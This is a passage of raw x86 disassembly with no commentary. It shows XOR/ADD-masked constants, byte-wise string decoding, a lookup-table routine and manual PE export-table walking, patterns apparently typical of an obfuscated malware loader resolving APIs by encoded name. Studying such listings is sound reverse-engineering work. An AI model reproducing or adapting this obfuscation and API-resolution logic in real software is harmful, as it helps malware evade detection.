  41f819:	mov    eax,DWORD PTR [ebp+0xc]
  41f81c:	sub    eax,0x8
  41f81f:	mov    DWORD PTR [ebp-0xc],eax
  41f822:	mov    eax,DWORD PTR [ebp-0xc]
  41f825:	mov    eax,DWORD PTR [eax+0x28]
  41f828:	call   0x41f3cd
  41f82d:	mov    DWORD PTR [ebp+0x10],eax
  41f830:	push   DWORD PTR [ebp+0x10]
  41f833:	mov    edx,DWORD PTR [ebp-0x8]
  41f836:	call   0x41f574
  41f83b:	mov    eax,DWORD PTR [ebp-0x4]
  41f83e:	xor    eax,edi
  41f840:	add    eax,esi
  41f842:	cmp    eax,ebx
  41f844:	jne    0x41f84e
  41f846:	mov    eax,DWORD PTR [ebp-0x8]
  41f849:	call   0x41f45b
  41f84e:	mov    eax,DWORD PTR [ebp-0x14]
  41f851:	xor    eax,edi
  41f853:	add    eax,esi
  41f855:	push   eax
  41f856:	push   DWORD PTR [ebp-0x10]
  41f859:	mov    eax,DWORD PTR [ebp-0x8]
  41f85c:	call   0x41f187
  41f861:	mov    ecx,DWORD PTR [ebp-0x4]
  41f864:	xor    ecx,edi
  41f866:	add    ecx,esi
  41f868:	cmp    eax,ecx
  41f86a:	je     0x41f88f
  41f86c:	mov    eax,DWORD PTR [ebp+0xc]
  41f86f:	mov    eax,DWORD PTR [eax]
  41f871:	mov    DWORD PTR [ebp+0xc],eax
  41f874:	mov    eax,DWORD PTR [ebp+0x8]
  41f877:	mov    ecx,DWORD PTR [ebp+0xc]
  41f87a:	add    eax,0x14
  41f87d:	cmp    ecx,eax
  41f87f:	jne    0x41f819
  41f881:	mov    eax,DWORD PTR [ebp-0x4]
  41f884:	xor    eax,edi
  41f886:	add    eax,esi
  41f888:	pop    ebx
  41f889:	pop    edi
  41f88a:	pop    esi
  41f88b:	leave  
  41f88c:	ret    0xc
  41f88f:	mov    eax,DWORD PTR [ebp-0xc]
  41f892:	mov    eax,DWORD PTR [eax+0x18]
  41f895:	jmp    0x41f888
  41f897:	push   ebp
  41f898:	mov    ebp,esp
  41f89a:	mov    eax,DWORD PTR [ebp+0xc]
  41f89d:	sub    esp,0x10
  41f8a0:	cmp    DWORD PTR [ebp+0x8],0x0
  41f8a4:	push   ebx
  41f8a5:	push   esi
  41f8a6:	push   edi
  41f8a7:	je     0x41f95c
  41f8ad:	test   eax,eax
  41f8af:	je     0x41f95c
  41f8b5:	movzx  eax,WORD PTR [eax+0x20]
  41f8b9:	mov    ecx,eax
  41f8bb:	mov    DWORD PTR [ebp-0x10],eax
  41f8be:	xor    edx,edx
  41f8c0:	and    DWORD PTR [ebp-0x8],edx
  41f8c3:	mov    eax,0x8a8d
  41f8c8:	xor    ecx,eax
  41f8ca:	add    ecx,0x3b51
  41f8d0:	mov    DWORD PTR [ebp-0xc],ecx
  41f8d3:	and    DWORD PTR [ebp-0x4],0x0
  41f8d7:	xor    ecx,ecx
  41f8d9:	push   0x7e
  41f8db:	pop    edi
  41f8dc:	cmp    cx,WORD PTR [ebp-0xc]
  41f8e0:	jae    0x41f946
  41f8e2:	lea    esi,[edx-0x3b51]
  41f8e8:	xor    esi,eax
  41f8ea:	movzx  ecx,WORD PTR [ebp-0x4]
  41f8ee:	mov    ebx,DWORD PTR [ebp+0xc]
  41f8f1:	lea    ecx,[ebx+ecx*4]
  41f8f4:	cmp    WORD PTR [ecx+0x2],si
  41f8f8:	jne    0x41f931
  41f8fa:	movzx  ecx,WORD PTR [ecx]
  41f8fd:	mov    edi,0x4e22
  41f902:	cmp    cx,di
  41f905:	jne    0x41f913
  41f907:	mov    ebx,DWORD PTR [ebp+0x8]
  41f90a:	movzx  edi,dx
  41f90d:	cmp    BYTE PTR [edi+ebx*1],0x0
  41f911:	je     0x41f940
  41f913:	mov    ebx,DWORD PTR [ebp+0x8]
  41f916:	movzx  edi,dx
  41f919:	movsx  di,BYTE PTR [edi+ebx*1]
  41f91e:	mov    ebx,0x3b51
  41f923:	sub    di,bx
  41f926:	xor    di,ax
  41f929:	cmp    cx,di
  41f92c:	je     0x41f940
  41f92e:	push   0x7c
  41f930:	pop    edi
  41f931:	inc    DWORD PTR [ebp-0x4]
  41f934:	mov    cx,WORD PTR [ebp-0xc]
  41f938:	cmp    WORD PTR [ebp-0x4],cx
  41f93c:	jb     0x41f8ea
  41f93e:	jmp    0x41f946
  41f940:	inc    DWORD PTR [ebp-0x8]
  41f943:	push   0x7d
  41f945:	pop    edi
  41f946:	mov    esi,DWORD PTR [ebp+0x8]
  41f949:	movzx  ecx,dx
  41f94c:	cmp    BYTE PTR [ecx+esi*1],0x0
  41f950:	je     0x41f965
  41f952:	inc    edx
  41f953:	cmp    edi,0x7c
  41f956:	jne    0x41f8d3
  41f95c:	xor    eax,eax
  41f95e:	pop    edi
  41f95f:	pop    esi
  41f960:	pop    ebx
  41f961:	leave  
  41f962:	ret    0x8
  41f965:	mov    ecx,DWORD PTR [ebp-0x8]
  41f968:	add    ecx,0xffffc4af
  41f96e:	xor    cx,ax
  41f971:	xor    eax,eax
  41f973:	cmp    cx,WORD PTR [ebp-0x10]
  41f977:	sete   al
  41f97a:	jmp    0x41f95e
  41f97c:	push   ebp
  41f97d:	mov    ebp,esp
  41f97f:	sub    esp,0x50
  41f982:	push   edi
  41f983:	mov    edi,eax
  41f985:	mov    eax,DWORD PTR [edi+0x1a8]
  41f98b:	cmp    DWORD PTR [eax],0x0
  41f98e:	jne    0x41f997
  41f990:	xor    eax,eax
  41f992:	jmp    0x41fac8
  41f997:	push   DWORD PTR [ebp+0x8]
  41f99a:	push   0x2c
  41f99c:	pop    eax
  41f99d:	call   0x41f72c
  41f9a2:	mov    edx,DWORD PTR [edi+0x1ac]
  41f9a8:	lea    eax,[edi+0x22]
  41f9ab:	mov    DWORD PTR [ebp-0x4c],eax
  41f9ae:	lea    eax,[edi+0x44]
  41f9b1:	mov    DWORD PTR [ebp-0x48],eax
  41f9b4:	lea    eax,[edi+0x66]
  41f9b7:	mov    DWORD PTR [ebp-0x44],eax
  41f9ba:	lea    eax,[edi+0x88]
  41f9c0:	mov    DWORD PTR [ebp-0x40],eax
  41f9c3:	lea    eax,[edi+0xaa]
  41f9c9:	mov    DWORD PTR [ebp-0x3c],eax
  41f9cc:	lea    eax,[edi+0xcc]
  41f9d2:	mov    DWORD PTR [ebp-0x38],eax
  41f9d5:	lea    eax,[edi+0xee]
  41f9db:	mov    DWORD PTR [ebp-0x34],eax
  41f9de:	lea    eax,[edi+0x110]
  41f9e4:	mov    DWORD PTR [ebp-0x30],eax
  41f9e7:	lea    eax,[edi+0x132]
  41f9ed:	mov    DWORD PTR [ebp-0x2c],eax
  41f9f0:	lea    eax,[edi+0x154]
  41f9f6:	push   edi
  41f9f7:	mov    DWORD PTR [ebp-0x50],edi
  41f9fa:	mov    DWORD PTR [ebp-0x28],eax
  41f9fd:	call   0x41fafc
  41fa02:	push   eax
  41fa03:	mov    eax,DWORD PTR [edi+0x1a8]
  41fa09:	push   DWORD PTR [eax]
  41fa0b:	call   0x41f79d
  41fa10:	mov    DWORD PTR [ebp-0x10],eax
  41fa13:	test   eax,eax
  41fa15:	je     0x41fac8
  41fa1b:	mov    ecx,DWORD PTR [eax+0x3c]
  41fa1e:	push   ebx
  41fa1f:	push   esi
  41fa20:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41fa24:	add    esi,eax
  41fa26:	mov    edi,DWORD PTR [esi+0x24]
  41fa29:	mov    ecx,DWORD PTR [esi+0x1c]
  41fa2c:	mov    edx,DWORD PTR [esi+0x20]
  41fa2f:	mov    ebx,DWORD PTR [esi+0x18]
  41fa32:	add    edi,eax
  41fa34:	mov    DWORD PTR [ebp-0x20],edi
  41fa37:	mov    edi,DWORD PTR [esi+0x14]
  41fa3a:	add    ecx,eax
  41fa3c:	add    edx,eax
  41fa3e:	mov    DWORD PTR [ebp-0xc],ecx
  41fa41:	mov    DWORD PTR [ebp-0x1c],edx
  41fa44:	mov    DWORD PTR [ebp-0x8],edi
  41fa47:	cmp    edi,ebx
  41fa49:	ja     0x41fa4e
  41fa4b:	mov    DWORD PTR [ebp-0x8],ebx
  41fa4e:	xor    ebx,ebx
  41fa50:	mov    DWORD PTR [ebp-0x18],ebx
  41fa53:	cmp    DWORD PTR [ebp-0x8],ebx
  41fa56:	jbe    0x41fac6
  41fa58:	jmp    0x41fa5d
  41fa5a:	mov    edx,DWORD PTR [ebp-0x1c]
  41fa5d:	mov    edi,DWORD PTR [ebp-0x20]
  41fa60:	movzx  edi,WORD PTR [edi+ebx*2]
  41fa64:	cmp    ebx,DWORD PTR [esi+0x18]
  41fa67:	jae    0x41fac6
  41fa69:	cmp    edi,DWORD PTR [esi+0x14]
  41fa6c:	jae    0x41fac6
  41fa6e:	mov    ebx,DWORD PTR [edx+ebx*4]
  41fa71:	mov    edx,DWORD PTR [ebp+0x8]
  41fa74:	mov    edi,DWORD PTR [ecx+edi*4]
  41fa77:	mov    DWORD PTR [ebp-0x4],edx
  41fa7a:	lea    edx,[ebp-0x50]
  41fa7d:	add    ebx,eax
  41fa7f:	add    edi,eax
  41fa81:	sub    edx,DWORD PTR [ebp+0x8]
  41fa84:	mov    DWORD PTR [ebp-0x14],0xb
  41fa8b:	mov    DWORD PTR [ebp-0x24],edx
  41fa8e:	mov    edx,DWORD PTR [ebp-0x4]
  41fa91:	cmp    DWORD PTR [edx],0x0
  41fa94:	jne    0x41fab1
  41fa96:	mov    eax,DWORD PTR [ebp-0x24]
  41fa99:	push   DWORD PTR [eax+edx*1]
  41fa9c:	push   ebx
  41fa9d:	call   0x41f897
  41faa2:	mov    ecx,DWORD PTR [ebp-0xc]
  41faa5:	test   eax,eax
  41faa7:	je     0x41faae
  41faa9:	mov    eax,DWORD PTR [ebp-0x4]
  41faac:	mov    DWORD PTR [eax],edi
  41faae:	mov    eax,DWORD PTR [ebp-0x10]
  41fab1:	add    DWORD PTR [ebp-0x4],0x4
  41fab5:	dec    DWORD PTR [ebp-0x14]
  41fab8:	jne    0x41fa8e
  41faba:	mov    ebx,DWORD PTR [ebp-0x18]
  41fabd:	inc    ebx
  41fabe:	mov    DWORD PTR [ebp-0x18],ebx
  41fac1:	cmp    ebx,DWORD PTR [ebp-0x8]
  41fac4:	jb     0x41fa5a
  41fac6:	pop    esi
  41fac7:	pop    ebx
  41fac8:	pop    edi
  41fac9:	leave  
  41faca:	ret    0x4
  41facd:	push   ebp
  41face:	mov    ebp,esp
  41fad0:	mov    eax,DWORD PTR [ebp+0x8]
  41fad3:	push   esi
  41fad4:	push   DWORD PTR [eax+0x1d8]
  41fada:	lea    esi,[eax+0x198]
  41fae0:	mov    eax,DWORD PTR [ebp+0x8]
  41fae3:	call   0x41f97c
  41fae8:	mov    ecx,DWORD PTR [esi]
  41faea:	mov    DWORD PTR [ecx],eax
  41faec:	mov    eax,DWORD PTR [esi]
  41faee:	xor    ecx,ecx
  41faf0:	cmp    DWORD PTR [eax],ecx
  41faf2:	pop    esi
  41faf3:	setne  cl
  41faf6:	mov    eax,ecx
  41faf8:	pop    ebp
  41faf9:	ret    0x4
  41fafc:	mov    ecx,DWORD PTR [edi+0x188]
  41fb02:	push   ebx
  41fb03:	jmp    0x41fb18
  41fb05:	xor    eax,0x8a8d
  41fb0a:	add    eax,0x3b51
  41fb0f:	mov    WORD PTR [ecx],ax
  41fb12:	add    ecx,0x2
  41fb15:	add    edx,0x2
  41fb18:	movzx  eax,WORD PTR [edx]
  41fb1b:	mov    ebx,0x4e22
  41fb20:	cmp    ax,bx
  41fb23:	jne    0x41fb05
  41fb25:	xor    eax,eax
  41fb27:	mov    WORD PTR [ecx],ax
  41fb2a:	mov    eax,DWORD PTR [edi+0x188]
  41fb30:	pop    ebx
  41fb31:	ret    
  41fb32:	push   edi
  41fb33:	mov    edi,eax
  41fb35:	mov    eax,DWORD PTR [esi+0x188]
  41fb3b:	shl    edi,0x6
  41fb3e:	add    eax,edi
  41fb40:	jmp    0x41fb4c
  41fb42:	xor    cl,0x74
  41fb45:	sub    cl,0x8
  41fb48:	mov    BYTE PTR [eax],cl
  41fb4a:	inc    eax
  41fb4b:	inc    edx
  41fb4c:	mov    cl,BYTE PTR [edx]
  41fb4e:	cmp    cl,0x7c
  41fb51:	jne    0x41fb42
  41fb53:	mov    BYTE PTR [eax],0x0
  41fb56:	mov    eax,DWORD PTR [esi+0x188]
  41fb5c:	add    eax,edi
  41fb5e:	pop    edi
  41fb5f:	ret    
  41fb60:	push   ebp
  41fb61:	mov    ebp,esp
  41fb63:	sub    esp,0x38
  41fb66:	push   ebx
  41fb67:	mov    ebx,0xf89c8585
  41fb6c:	mov    DWORD PTR [ebp-0x4],ebx
  41fb6f:	lea    eax,[ebx-0x1]
  41fb72:	push   esi
  41fb73:	mov    DWORD PTR [ebp-0x24],eax
  41fb76:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb79:	mov    edx,DWORD PTR [ebp+0x8]
  41fb7c:	mov    esi,0x751089b
  41fb81:	push   edi
  41fb82:	xor    ecx,esi
  41fb84:	mov    edi,0x3272e2
  41fb89:	add    ecx,edi
  41fb8b:	cmp    edx,ecx
  41fb8d:	je     0x41fcfb
  41fb93:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb96:	mov    edx,DWORD PTR [ebp+0xc]
  41fb99:	xor    ecx,esi
  41fb9b:	add    ecx,edi
  41fb9d:	cmp    edx,ecx
  41fb9f:	je     0x41fcfb
  41fba5:	mov    ecx,DWORD PTR [ebp+0x10]
  41fba8:	mov    DWORD PTR [ebp-0x18],ecx
  41fbab:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbae:	mov    DWORD PTR [ebp-0x14],ecx
  41fbb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbb4:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  41fbbb:	mov    DWORD PTR [ebp-0x20],eax
  41fbbe:	mov    DWORD PTR [ebp-0x10],ebx
  41fbc1:	mov    DWORD PTR [ebp+0xc],eax
  41fbc4:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41fbcb:	mov    eax,DWORD PTR [ebp+0xc]
  41fbce:	mov    DWORD PTR [ebp-0xc],ecx
  41fbd1:	xor    eax,esi
  41fbd3:	mov    ecx,0xffcd8d1e
  41fbd8:	sub    ecx,eax
  41fbda:	add    ecx,DWORD PTR [ebp-0x14]
  41fbdd:	mov    DWORD PTR [ebp+0x8],ecx
  41fbe0:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41fbe7:	jmp    0x41fceb
  41fbec:	mov    eax,DWORD PTR [ebp+0xc]
  41fbef:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbf2:	xor    eax,esi
  41fbf4:	xor    ecx,esi
  41fbf6:	lea    ecx,[eax+ecx*1+0x64e5c4]
  41fbfd:	mov    eax,DWORD PTR [ebp+0x8]
  41fc00:	xor    edx,edx
  41fc02:	div    ecx
  41fc04:	mov    eax,DWORD PTR [ebp+0x10]
  41fc07:	mov    ecx,DWORD PTR [ebp+0xc]
  41fc0a:	xor    eax,esi
  41fc0c:	xor    ecx,esi
  41fc0e:	sub    eax,ecx
  41fc10:	cmp    edx,eax
  41fc12:	jne    0x41fca7
  41fc18:	mov    eax,DWORD PTR [ebp+0x8]
  41fc1b:	add    eax,DWORD PTR [ebp-0xc]
  41fc1e:	mov    dl,BYTE PTR [eax]
  41fc20:	mov    eax,DWORD PTR [ebp-0x10]
  41fc23:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc26:	xor    eax,esi
  41fc28:	xor    ecx,esi
  41fc2a:	add    eax,edi
  41fc2c:	add    ecx,edi
  41fc2e:	cmp    eax,ecx
  41fc30:	jae    0x41fc78
  41fc32:	lea    ecx,[eax-0x3272e2]
  41fc38:	mov    DWORD PTR [ebp-0x4],ecx
  41fc3b:	mov    ebx,DWORD PTR [ebp-0x4]
  41fc3e:	xor    ebx,esi
  41fc40:	add    ebx,0x7f55d8fb
  41fc46:	lea    ecx,[ebp+eax*4-0x38]
  41fc4a:	mov    DWORD PTR [ecx],ebx
  41fc4c:	mov    ebx,DWORD PTR [ecx]
  41fc4e:	cmp    ebx,0x244ecbda
  41fc54:	jbe    0x41fc5e
  41fc56:	add    DWORD PTR [ecx],0x405fc19
  41fc5c:	jmp    0x41fc64
  41fc5e:	add    DWORD PTR [ecx],0xfdaf43e7
  41fc64:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc67:	xor    ecx,esi
  41fc69:	inc    eax
  41fc6a:	inc    DWORD PTR [ebp-0x4]
  41fc6d:	add    ecx,edi
  41fc6f:	cmp    eax,ecx
  41fc71:	jb     0x41fc3b
  41fc73:	mov    ebx,0xf89c8585
  41fc78:	mov    eax,DWORD PTR [ebp-0x18]
  41fc7b:	test   eax,eax
  41fc7d:	jne    0x41fc87
  41fc7f:	xor    dl,0x74
  41fc82:	sub    dl,0x8
  41fc85:	jmp    0x41fc9d
  41fc87:	mov    eax,DWORD PTR [ebp-0x1c]
  41fc8a:	xor    al,0x9b
  41fc8c:	mov    cl,0x1e
  41fc8e:	sub    cl,al
  41fc90:	add    dl,cl
  41fc92:	mov    ecx,DWORD PTR [ebp-0x20]
  41fc95:	xor    cl,0x9b
  41fc98:	sub    cl,0x1e
  41fc9b:	ror    dl,cl
  41fc9d:	xor    eax,eax
  41fc9f:	mov    eax,DWORD PTR [ebp+0x8]
  41fca2:	add    eax,DWORD PTR [ebp-0xc]
  41fca5:	mov    BYTE PTR [eax],dl
  41fca7:	mov    eax,DWORD PTR [ebp+0x8]
  41fcaa:	mov    ecx,DWORD PTR [ebp-0x10]
  41fcad:	sub    eax,edi
  41fcaf:	xor    eax,esi
  41fcb1:	cmp    eax,ecx
  41fcb3:	jne    0x41fcd9
  41fcb5:	mov    eax,DWORD PTR [ebp+0x10]
  41fcb8:	mov    ecx,DWORD PTR [ebp+0xc]
  41fcbb:	xor    eax,esi
  41fcbd:	xor    ecx,esi
  41fcbf:	sub    eax,ecx
  41fcc1:	sub    eax,edi
  41fcc3:	xor    eax,esi
  41fcc5:	mov    DWORD PTR [ebp+0x10],eax
  41fcc8:	mov    eax,DWORD PTR [ebp+0xc]
  41fccb:	xor    eax,esi
  41fccd:	mov    ecx,0xffcd8d1e
  41fcd2:	sub    ecx,eax
  41fcd4:	add    ecx,DWORD PTR [ebp-0x14]
  41fcd7:	jmp    0x41fce8
  41fcd9:	mov    eax,DWORD PTR [ebp+0xc]
  41fcdc:	xor    eax,esi
  41fcde:	mov    ecx,0xffcd8d1e
  41fce3:	sub    ecx,eax
  41fce5:	add    ecx,DWORD PTR [ebp+0x8]
  41fce8:	mov    DWORD PTR [ebp+0x8],ecx
  41fceb:	mov    eax,DWORD PTR [ebp+0x10]
  41fcee:	cmp    eax,ebx
  41fcf0:	jne    0x41fbec
  41fcf6:	mov    eax,DWORD PTR [ebp-0x24]
  41fcf9:	jmp    0x41fcfe
  41fcfb:	mov    eax,DWORD PTR [ebp-0x4]
  41fcfe:	xor    eax,esi
  41fd00:	add    eax,edi
  41fd02:	pop    edi
  41fd03:	pop    esi
  41fd04:	pop    ebx
  41fd05:	leave  
  41fd06:	ret    0xc
  41fd09:	push   ebp
  41fd0a:	mov    ebp,esp
  41fd0c:	sub    esp,0x14
  41fd0f:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41fd16:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  41fd1d:	mov    eax,DWORD PTR [ebx]
  41fd1f:	mov    DWORD PTR [ebp-0x8],eax
  41fd22:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41fd29:	push   esi
  41fd2a:	push   edi
  41fd2b:	mov    DWORD PTR [ebp-0x14],0xead718a5
  41fd32:	mov    edi,DWORD PTR [ebp-0x4]
  41fd35:	mov    ecx,DWORD PTR [ebp-0x10]
  41fd38:	mov    eax,0x751089b
  41fd3d:	xor    edi,eax
  41fd3f:	mov    edx,0x3272e2
  41fd44:	xor    ecx,eax
  41fd46:	add    edi,edx
  41fd48:	add    ecx,edx
  41fd4a:	imul   edi,ecx
  41fd4d:	jmp    0x41fd95
  41fd4f:	mov    ecx,DWORD PTR [ebp-0x8]
  41fd52:	mov    esi,DWORD PTR [ebp-0x4]
  41fd55:	xor    ecx,eax
  41fd57:	xor    esi,eax
  41fd59:	add    ecx,edx
  41fd5b:	add    esi,edx
  41fd5d:	test   esi,ecx
  41fd5f:	mov    esi,DWORD PTR [ebp-0x8]
  41fd62:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd65:	je     0x41fd7c
  41fd67:	xor    ecx,eax
  41fd69:	xor    esi,eax
  41fd6b:	add    ecx,edx
  41fd6d:	add    esi,edx
  41fd6f:	shr    esi,cl
  41fd71:	mov    ecx,DWORD PTR [ebp-0x14]
  41fd74:	xor    ecx,eax
  41fd76:	add    ecx,edx
  41fd78:	xor    esi,ecx
  41fd7a:	jmp    0x41fd86
  41fd7c:	xor    esi,eax
  41fd7e:	xor    ecx,eax
  41fd80:	add    esi,edx
  41fd82:	add    ecx,edx
  41fd84:	shr    esi,cl
  41fd86:	mov    DWORD PTR [ebp-0x8],esi
  41fd89:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd8c:	xor    ecx,eax
  41fd8e:	lea    edi,[edi+ecx*1+0x3272e2]
  41fd95:	mov    ecx,DWORD PTR [ebp-0xc]
  41fd98:	mov    esi,DWORD PTR [ebp-0x4]
  41fd9b:	xor    esi,eax
  41fd9d:	xor    ecx,eax
  41fd9f:	sub    ecx,esi
  41fda1:	cmp    edi,ecx
  41fda3:	jbe    0x41fd4f
  41fda5:	mov    eax,DWORD PTR [ebp-0x8]
  41fda8:	pop    edi
  41fda9:	mov    DWORD PTR [ebx],eax
  41fdab:	mov    eax,DWORD PTR [ebp-0x8]
  41fdae:	pop    esi
  41fdaf:	leave  
  41fdb0:	ret    
  41fdb1:	push   ebp
  41fdb2:	mov    ebp,esp
  41fdb4:	sub    esp,0x420
  41fdba:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41fdc1:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41fdc8:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  41fdcf:	push   ebx
  41fdd0:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41fdd7:	mov    eax,DWORD PTR [ebp-0x14]
  41fdda:	push   esi
  41fddb:	mov    esi,0x751089b
  41fde0:	push   edi
  41fde1:	xor    eax,esi
  41fde3:	mov    edi,0x3272e2
  41fde8:	add    eax,edi
  41fdea:	mov    DWORD PTR [ebp-0x8],eax
  41fded:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41fdf4:	mov    DWORD PTR [ebp-0x4],0xead718a5
  41fdfb:	mov    DWORD PTR [ebp-0x10],0x8
  41fe02:	mov    ecx,ecx
  41fe04:	mov    eax,DWORD PTR [ebp-0xc]
  41fe07:	mov    ecx,DWORD PTR [ebp-0x14]
  41fe0a:	xor    eax,esi
  41fe0c:	xor    ecx,esi
  41fe0e:	add    eax,edi
  41fe10:	add    ecx,edi
  41fe12:	imul   eax,ecx
  41fe15:	jmp    0x41fe48
  41fe17:	mov    eax,DWORD PTR [ebp-0x4]
  41fe1a:	sub    eax,edi
  41fe1c:	xor    eax,esi
  41fe1e:	mov    DWORD PTR [ebp-0x8],eax
  41fe21:	lea    ebx,[ebp-0x8]
  41fe24:	call   0x41fd09
  41fe29:	mov    DWORD PTR [ebp-0x8],eax
  41fe2c:	mov    eax,DWORD PTR [ebp-0x8]
  41fe2f:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe32:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41fe39:	mov    eax,DWORD PTR [ebp-0xc]
  41fe3c:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe3f:	xor    eax,esi
  41fe41:	lea    eax,[eax+ecx*1+0x3272e2]
  41fe48:	mov    DWORD PTR [ebp-0x4],eax
  41fe4b:	mov    eax,DWORD PTR [ebp-0x18]
  41fe4e:	mov    ecx,DWORD PTR [ebp-0xc]
  41fe51:	xor    ecx,esi
  41fe53:	xor    eax,esi
  41fe55:	sub    eax,ecx
  41fe57:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe5a:	cmp    ecx,eax
  41fe5c:	jbe    0x41fe17
  41fe5e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fe61:	xor    eax,esi
  41fe63:	add    eax,edi
  41fe65:	mov    DWORD PTR [ebp-0x8],eax
  41fe68:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41fe6f:	mov    ebx,ebx
  41fe71:	jmp    0x41fed4
  41fe73:	mov    ecx,DWORD PTR [ebp-0x20]
  41fe76:	mov    eax,DWORD PTR [ebp-0x8]
  41fe79:	xor    ecx,esi
  41fe7b:	add    ecx,edi
  41fe7d:	shr    eax,cl
  41fe7f:	mov    DWORD PTR [ebp-0x4],eax
  41fe82:	mov    eax,DWORD PTR [ebp+0x8]
  41fe85:	mov    cl,BYTE PTR [eax]
  41fe87:	mov    BYTE PTR [ebp+0xb],cl
  41fe8a:	mov    cl,BYTE PTR [ebp+0xb]
  41fe8d:	mov    edx,DWORD PTR [ebp-0x8]
  41fe90:	movzx  ecx,cl
  41fe93:	xor    ecx,edx
  41fe95:	mov    DWORD PTR [ebp+0x8],ecx
  41fe98:	mov    ecx,DWORD PTR [ebp-0x18]
  41fe9b:	mov    edx,DWORD PTR [ebp+0x8]
  41fe9e:	xor    ecx,esi
  41fea0:	add    ecx,edi
  41fea2:	and    ecx,edx
  41fea4:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41feab:	mov    edx,DWORD PTR [ebp-0x4]
  41feae:	xor    ecx,edx
  41feb0:	mov    DWORD PTR [ebp-0x8],ecx
  41feb3:	mov    ecx,DWORD PTR [ebp-0xc]
  41feb6:	xor    ecx,esi
  41feb8:	lea    eax,[eax+ecx*1+0x3272e2]
  41febf:	mov    DWORD PTR [ebp+0x8],eax
  41fec2:	mov    eax,DWORD PTR [ebp-0xc]
  41fec5:	xor    eax,esi
  41fec7:	mov    ecx,0xffcd8d1e
  41fecc:	sub    ecx,eax
  41fece:	add    ecx,DWORD PTR [ebp-0x10]
  41fed1:	mov    DWORD PTR [ebp-0x10],ecx
  41fed4:	mov    eax,DWORD PTR [ebp-0x14]
  41fed7:	mov    ecx,DWORD PTR [ebp-0x10]
  41feda:	xor    eax,esi
  41fedc:	add    eax,edi
  41fede:	cmp    ecx,eax
  41fee0:	jne    0x41fe73
  41fee2:	mov    eax,DWORD PTR [ebp-0x1c]
  41fee5:	mov    ecx,DWORD PTR [ebp-0x8]
  41fee8:	xor    eax,esi
  41feea:	add    eax,edi
  41feec:	pop    edi
  41feed:	pop    esi
  41feee:	xor    eax,ecx
  41fef0:	pop    ebx
  41fef1:	leave  
  41fef2:	ret    0x4
  41fef5:	push   ebp
  41fef6:	mov    ebp,esp
  41fef8:	mov    eax,DWORD PTR [ebp+0x1c]
  41fefb:	mov    ecx,DWORD PTR [ebp+0x8]
  41fefe:	mov    edx,DWORD PTR [ebp+0x10]
  41ff01:	mov    eax,DWORD PTR [eax+0x190]
  41ff07:	mov    eax,DWORD PTR [eax]
  41ff09:	sub    esp,0x64
  41ff0c:	push   ebx
  41ff0d:	push   esi
  41ff0e:	push   edi
  41ff0f:	mov    edi,0x751089b
  41ff14:	xor    ecx,edi
  41ff16:	mov    ebx,0x3272e2
  41ff1b:	add    ecx,ebx
  41ff1d:	cmp    ecx,edx
  41ff1f:	jne    0x41ff30
  41ff21:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ff2b:	jmp    0x42042c
  41ff30:	mov    ecx,DWORD PTR [ebp+0x8]
  41ff33:	mov    esi,DWORD PTR [ebp+0x14]
  41ff36:	mov    edx,DWORD PTR [esi]
  41ff38:	xor    ecx,edi
  41ff3a:	add    ecx,ebx
  41ff3c:	cmp    edx,ecx
  41ff3e:	je     0x4203e7
  41ff44:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff47:	mov    DWORD PTR [ebp-0x1c],eax
  41ff4a:	mov    DWORD PTR [ebp+0x1c],ecx
  41ff4d:	mov    ecx,DWORD PTR [ebp+0x18]
  41ff50:	mov    eax,DWORD PTR [esi]
  41ff52:	mov    DWORD PTR [ebp-0x20],eax
  41ff55:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  41ff5c:	mov    edx,0xf89c8584
  41ff61:	mov    DWORD PTR [ebp-0x8],edx
  41ff64:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff67:	mov    DWORD PTR [ebp+0x1c],eax
  41ff6a:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff6d:	mov    eax,DWORD PTR [eax+0x190]
  41ff73:	mov    eax,DWORD PTR [eax]
  41ff75:	mov    DWORD PTR [ebp-0x24],ecx
  41ff78:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff7b:	mov    ecx,DWORD PTR [ecx+0x190]
  41ff81:	mov    ecx,DWORD PTR [ecx]
  41ff83:	add    ecx,DWORD PTR [eax+0x3c]
  41ff86:	mov    DWORD PTR [ebp+0x10],ecx
  41ff89:	mov    eax,DWORD PTR [ebp+0x8]
  41ff8c:	xor    eax,edi
  41ff8e:	add    eax,ebx
  41ff90:	mov    DWORD PTR [ebp-0x4],eax
  41ff93:	mov    eax,DWORD PTR [ebp+0x8]
  41ff96:	xor    eax,edi
  41ff98:	add    eax,ebx
  41ff9a:	mov    DWORD PTR [ebp+0x18],eax
  41ff9d:	mov    eax,DWORD PTR [ebp+0x10]
  41ffa0:	mov    eax,DWORD PTR [eax+0x50]
  41ffa3:	sub    eax,0xc
  41ffa6:	mov    DWORD PTR [ebp-0x28],eax
  41ffa9:	mov    eax,DWORD PTR [ebp+0x10]
